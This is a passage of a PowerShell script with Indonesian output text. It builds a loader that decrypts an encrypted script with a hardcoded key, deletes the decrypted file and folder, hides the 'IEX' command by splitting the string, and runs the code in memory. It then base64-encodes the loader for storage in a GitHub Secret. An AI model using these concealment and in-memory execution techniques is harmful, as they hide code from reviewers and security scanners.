$p = Join-Path $pwd "r4dx.dexenc"
if (Test-Path $p) {
    dexenc decrypt -i $p -key r4dex4444 -o "$pwd\r4dx.ps1"
    if (Test-Path "$pwd\r4dx.ps1") {
        $content = Get-Content "$pwd\r4dx.ps1" -Raw
        Remove-Item "$pwd\r4dx.ps1" -Force
        Remove-Item -Recurse -Force dex-enc
        $e = "I" + "E" + "X"
        & $e ($content)
    }
}
'@

$bytes = [System.Text.Encoding]::UTF8.GetBytes($myCode)
$base64 = [Convert]::ToBase64String($bytes)

Write-Host "`n[+] HASIL ENCODE (Copy string di bawah ini ke GitHub Secret):`n" -ForegroundColor Green
$base64